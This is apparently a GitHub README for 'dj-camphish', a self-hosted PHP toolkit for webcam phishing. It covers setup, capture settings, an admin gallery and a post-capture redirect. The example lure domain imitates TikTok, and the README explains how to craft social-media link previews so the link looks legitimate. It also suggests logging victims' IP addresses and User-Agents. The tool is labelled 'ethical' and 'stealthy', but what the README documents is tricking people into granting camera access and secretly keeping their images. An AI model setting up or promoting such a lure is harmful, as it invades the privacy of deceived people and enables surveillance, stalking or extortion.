# dj-camphish

`dj-camphish` is a stealthy browser-based webcam capture and redirect toolkit, designed for ethical red team labs, OSINT, and privacy awareness demonstrations. It captures webcam snapshots with user permission, saves them server-side, and redirects users to a specified URL seamlessly.

---

## Features

- 🔒 **Stealth Webcam Capture**: Silently captures webcam images with user consent.
- ⚙️ **Admin Panel**: View, manage (delete/download), and configure captures, redirect URLs, and social media thumbnails via `gallery.php`.
- 📷 **Automatic Image Capture**: Configurable capture count and intervals with server-side storage.
- 🔗 **Post-Capture Redirect**: Automatically redirects users to a customizable URL.
- 🖼️ **Social Media Preview**: Supports custom thumbnails (1200x630) for link previews.
- 🔐 **CSRF Protection**: Secure admin actions with CSRF token validation.
- 🎨 **Modern UI**: Admin panel styled with Tailwind CSS for a responsive, intuitive experience.
- 🛠️ **Lightweight & Self-Hosted**: Built with PHP for easy deployment on any server.
- 🎯 **Ethical Use**: Ideal for ethical hacking, OSINT training, and privacy demos.

---

## Project Structure

```
/dj-camphish/
├── index.php           # Capture page with loader and Open Graph meta tags
├── capture.js          # Handles webcam access and image capture
├── save.php            # Server-side image save handler
├── config.php          # Configuration for capture settings and CSRF secret
├── gallery.php         # Admin panel for managing captures, URLs, and thumbnails
├── delete_images.php   # Handles image deletion with CSRF protection
├── download_images.php # Handles image downloads (single or ZIP) with CSRF protection
├── update_redirect.php # Updates redirect URL and thumbnail with CSRF protection
├── get_csrf_token.php  # Generates CSRF tokens for AJAX requests
├── logout.php          # Logs out admin users
├── redirect.txt        # Stores the target redirect URL
├── thumbnail.png       # Social media thumbnail (1200x630)
├── fallback.png        # Fallback thumbnail if none uploaded
├── logs.txt            # Logs session and error data
├── captures/           # Stores captured images (e.g., 68e8c7736e5de.png)
```

---

## Setup & Usage

1. **Prerequisites**:
   - PHP-enabled hosting (e.g., localhost with XAMPP, VPS, or cPanel).
   - PHP extensions: `zip` for downloads, `gd` for image processing.
   - Writeable `/captures/` directory and files (`redirect.txt`, `logs.txt`, `thumbnail.png`).

2. **Installation**:
   - Clone or upload the repository to your server:
     ```bash
     git clone https://github.com/rootuserdj/dj-camphish.git
     ```
   - Set permissions:
     ```bash
     chmod 755 captures/
     chmod 644 redirect.txt logs.txt thumbnail.png fallback.png
     ```
   - Update `config.php` with a secure `csrf_secret`:
     ```php
     'csrf_secret' => 'your-secure-32-byte-string',
     ```
     Generate one with: `echo bin2hex(random_bytes(32));`

3. **Configuration**:
   - Edit `config.php` to set capture count and interval:
     ```php
     'capture' => [
         'max_captures' => 2,
         'interval_ms' => 1500,
         'canvas_width' => 640,
         'canvas_height' => 480,
     ],
     ```
   - Access `gallery.php` (e.g., `https://tiktoks.wuaze.com/gallery.php`) to set redirect URL and upload a 1200x630 thumbnail.

4. **Usage**:
   - Share `index.php` URL (e.g., `https://tiktoks.wuaze.com/`).
   - Users grant camera permission → images are captured and saved to `captures/` → redirected to URL in `redirect.txt`.
   - Log in to `gallery.php` to view, delete, or download captures (e.g., `68e8c7736e5de.png`).

5. **Verify Thumbnail**:
   - Ensure `thumbnail.png` (1200x630) is uploaded via `gallery.php`.
   - Test link preview: `https://tiktoks.wuaze.com/` on Twitter/WhatsApp.
   - Clear social media cache if needed:
     - Twitter: [Card Validator](https://cards-dev.twitter.com/validator)
     - Facebook: [Sharing Debugger](https://developers.facebook.com/tools/debug/)

---

## Configuration

- **Capture Settings**: Modify `max_captures` and `interval_ms` in `config.php`.
- **Redirect URL & Thumbnail**: Update via `gallery.php`’s settings form.
- **Logging**: Enable/disable in `config.php` (`'logging' => true`).
- **Advanced Logging**: Extend `save.php` to log IP, User-Agent, or timestamps.
- **Security**: Ensure a unique `csrf_secret` in `config.php` for CSRF protection.

---

## Legal Notice

**Use responsibly. This tool is for educational and ethical purposes only.** Unauthorized use may violate privacy laws. Obtain explicit consent before capturing images.

---

## Contact

**Dhananjay Sah**  
📞 +977 9824204425  
✉️ rootuserdj@gmail.com

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

⭐ **If you find this useful, please star the repo!**  
[Star on GitHub](https://github.com/rootuserdj/dj-camphish/stargazers)

---

*Thank you for visiting!* 🙏
